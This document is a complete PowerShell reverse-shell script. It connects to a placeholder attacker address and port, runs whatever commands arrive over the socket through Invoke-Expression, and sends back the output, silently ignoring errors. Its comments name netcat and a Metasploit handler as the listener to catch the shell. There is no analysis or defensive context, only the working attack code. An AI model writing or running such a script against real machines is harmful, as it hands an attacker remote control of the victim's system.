$HOST = "192.168.0.1337" # Change accordingly
$PORT = 4444 # Either nc -vlp 4444, or metasploit exploit/multi/handler with windows/shell_reverse_tcp payload

$client = New-Object System.Net.Sockets.TcpClient ($HOST, $PORT)
$stream = $client.GetStream()
$buffer = New-Object System.Byte[] $client.ReceiveBufferSize
$enc = New-Object System.Text.AsciiEncoding

try {
    while ($TRUE) {
        $bytes = $stream.Read($buffer, 0, $buffer.length)
        if ($bytes -eq 0) {
            break
        }
        $result = Invoke-Expression $enc.GetString($buffer, 0, $bytes) | Out-String
        $result = $enc.GetBytes($result)
        $stream.Write($result, 0, $result.length)
    }
} catch {
    # ignore exceptions
} finally {
    $stream.Close()
}

$client.Close()
